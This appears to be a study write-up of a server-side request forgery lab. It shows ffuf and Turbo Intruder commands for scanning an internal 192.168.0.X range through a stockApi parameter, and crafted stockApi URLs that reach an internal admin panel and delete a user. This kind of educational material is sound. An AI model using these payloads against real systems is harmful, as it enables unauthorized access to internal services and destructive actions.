
---

## **💡 Quick Overview**

This lab demonstrates an **SSRF vulnerability** in the stock check feature. Both the instructor's solution and yours exploit the `stockApi` parameter to interact with an internal admin panel hosted at `192.168.0.X:8080`.

### **Why Both Solutions Work**:

- **Your Solution**: You used **ffuf** to automate scanning the internal IP range (`192.168.0.0-255`) for the admin panel. Once you identified the correct IP (`192.168.0.179`), you crafted a request to delete Carlos using Burp Repeater. This approach works because the application blindly processes user-supplied URLs in `stockApi` without validation.

- **Instructor's Solution**: The instructor leveraged **Turbo Intruder** for faster IP enumeration. The solution dynamically crafted payloads to identify the admin interface and similarly crafted a delete request targeting Carlos. This approach highlights efficient enumeration with Turbo Intruder's scripting.

---

## **🛠️ Steps to Complete the Lab**

1. **Intercept and Analyze Requests**:
    
    - Use Burp Suite to intercept a stock check request.
    - Examine the `stockApi` parameter to understand its structure.
2. **Enumerate the Internal IP Range**:
    
    - **Your Solution**: Use `ffuf` to fuzz the last octet of `192.168.0.X:8080`:
        
        ```plaintext
        ffuf -w numbers_0_to_255.txt -r -request ssrf.txt -mc 200
        ```
        
        - Identify the IP address (`192.168.0.179`) hosting the admin panel.
    - **Instructor's Solution**: Use **Turbo Intruder** with a Python loop to automate scanning:
        
        ```python
        for i in range(1, 256):
            stockApi = 'http://192.168.0.%s:8080/admin' % i
            engine.queue(target.req, stockApi)
        ```
        
        - Look for a `200 OK` response to identify the admin panel.
3. **Access the Admin Panel**:
    
    - Modify the `stockApi` parameter to point to the identified admin panel:
        
        ```plaintext
        stockApi=http://192.168.0.179:8080/admin
        ```
        
    - Send the request and inspect the response to confirm access to the admin interface.
4. **Delete Carlos**:
    
    - Locate the delete user endpoint in the admin panel:
        
        ```plaintext
        /admin/delete?username=carlos
        ```
        
    - Modify the `stockApi` parameter to include the delete URL:
        
        ```plaintext
        stockApi=http://192.168.0.179:8080/admin/delete?username=carlos
        ```
        
    - Send the request in Burp Repeater and verify Carlos is deleted.
5. **Complete the Lab**:
    
    - Confirm the lab completion message in the interface.

---

## **❓ Why This is an SSRF Vulnerability**

1. **User-Controlled Input**:
    
    - The `stockApi` parameter allows users to provide a URL, which the server processes without validation.
2. **Access to Internal Systems**:
    
    - By targeting `192.168.0.X:8080`, attackers exploit the server’s ability to interact with internal resources.
3. **Privilege Escalation**:
    
    - SSRF enables attackers to access an internal admin panel and delete a user without authentication.
4. **Impact**:
    
    - Unauthorized access to sensitive resources and the ability to execute privileged actions.

---